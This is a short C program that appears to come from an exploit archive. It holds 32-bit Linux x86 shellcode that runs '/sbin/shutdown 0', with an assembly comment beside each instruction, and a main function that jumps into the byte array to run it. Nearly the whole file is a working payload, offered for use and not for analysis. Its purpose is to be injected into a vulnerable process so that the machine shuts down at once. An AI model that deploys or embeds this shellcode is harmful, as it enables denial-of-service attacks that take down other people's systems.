#include <stdio.h>

const char shellcode[]=
	"\x6a\x0b"		// push	$0xb
	"\x58"			// pop	%eax
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x68\x64\x6f\x77\x6e"	// push	$0x6e776f64
	"\x68\x73\x68\x75\x74"	// push	$0x74756873
	"\x68\x69\x6e\x2f\x2f"	// push	$0x2f2f6e69
	"\x68\x2f\x2f\x73\x62"	// push	$0x62732f2f
	"\x89\xe3"		// mov	%esp,%ebx
	"\x52"			// push	%edx
	"\x6a\x30"		// push	$0x30
	"\x52"			// push	%edx
	"\x53"			// push	%ebx
	"\x89\xe1"		// mov	%esp,%ecx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 execve(/sbin/shutdown,/sbin/shutdown 0)"
		"\n[+] Date: 11/07/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}